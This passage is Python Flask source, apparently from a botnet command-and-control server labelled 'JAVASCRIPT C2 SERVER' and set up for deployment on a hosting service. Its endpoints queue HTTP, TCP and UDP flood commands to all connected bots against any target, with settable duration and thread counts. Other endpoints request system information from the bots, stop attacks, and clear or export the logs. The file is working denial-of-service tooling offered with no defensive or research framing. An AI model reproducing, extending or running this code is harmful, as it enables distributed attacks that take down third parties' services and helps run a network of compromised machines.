                sent_count += 1
        
        log_message = f'HTTP {method} flood to {sent_count} JavaScript bots -> {target} ({threads} threads)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} JavaScript bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_http_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/tcp', methods=['POST', 'OPTIONS'])
def launch_tcp_attack():
    """Launch TCP flood attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 75))
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online JavaScript bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'tcp_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_message = f'TCP flood to {sent_count} JavaScript bots -> {target} ({threads} threads)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} JavaScript bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_tcp_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/udp', methods=['POST', 'OPTIONS'])
def launch_udp_attack():
    """Launch UDP flood attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 75))
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online JavaScript bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'udp_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_message = f'UDP flood to {sent_count} JavaScript bots -> {target} ({threads} threads)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} JavaScript bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_udp_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/ping', methods=['POST', 'OPTIONS'])
def send_ping():
    """Send ping to bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online JavaScript bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'ping'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_activity(f'Ping sent to {sent_count} JavaScript bots', 'success')
        print(f"[+] Ping sent to {sent_count} JavaScript bots")
        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} JavaScript bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_ping: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/sysinfo', methods=['POST', 'OPTIONS'])
def send_sysinfo():
    """Request system info from bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online JavaScript bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'sysinfo'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_activity(f'Sysinfo request sent to {sent_count} JavaScript bots', 'success')
        print(f"[+] Sysinfo sent to {sent_count} JavaScript bots")
        return jsonify({'status': 'success', 'message': f'Sysinfo request sent to {sent_count} JavaScript bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_sysinfo: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/stop', methods=['POST', 'OPTIONS'])
def send_stop_all():
    """Stop all attacks on bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online JavaScript bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'stop_all'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_activity(f'Stop all attacks command sent to {sent_count} JavaScript bots', 'error')
        print(f"[+] Stop command sent to {sent_count} JavaScript bots")
        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} JavaScript bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_stop_all: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/logs/clear', methods=['POST', 'OPTIONS'])
def clear_logs():
    """Clear all activity logs"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        with log_lock:
            attack_logs.clear()
        log_activity('Activity logs cleared', 'warning')
        print(f"[+] Activity logs cleared")
        return jsonify({'status': 'success', 'message': 'Activity logs cleared'})
    except Exception as e:
        error_msg = f'Error in clear_logs: {str(e)}'
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/logs/export', methods=['GET', 'OPTIONS'])
def export_logs():
    """Export logs as text file"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        with log_lock:
            log_text = "JAVASCRIPT C2 SERVER LOGS\n"
            log_text += "=" * 60 + "\n\n"
            for log in attack_logs:
                log_text += f"[{log['time']}] {log['message']}\n"
        
        return Response(log_text, mimetype='text/plain')
    except Exception as e:
        error_msg = f'Error in export_logs: {str(e)}'
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def cleanup():
    """Cleanup on server shutdown"""
    print("\n[!] Server shutting down...")
    print(f"[+] Total JavaScript bots connected: {len(approved_bots)}")
    print(f"[+] Total logs recorded: {len(attack_logs)}")
    print("[+] Goodbye!")

if __name__ == '__main__':
    print("\n" + "="*60)
    print("  JAVASCRIPT C2 SERVER - JS ONLY")
    print("="*60)
    
    port = int(os.environ.get("PORT", 5000))
    
    print(f"[+] Starting server on port {port}")
    print(f"[+] Dashboard: https://c2-server-io.onrender.com")
    print(f"[+] Health check: https://c2-server-io.onrender.com/health")
    print(f"[+] Only JavaScript clients will be accepted")
    print(f"[+] Auto-approval enabled")
    print(f"[+] Waiting for JavaScript bot connections...\n")
    
    # Register cleanup function
    atexit.register(cleanup)
    
    # Production settings for Render.com
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True
    )
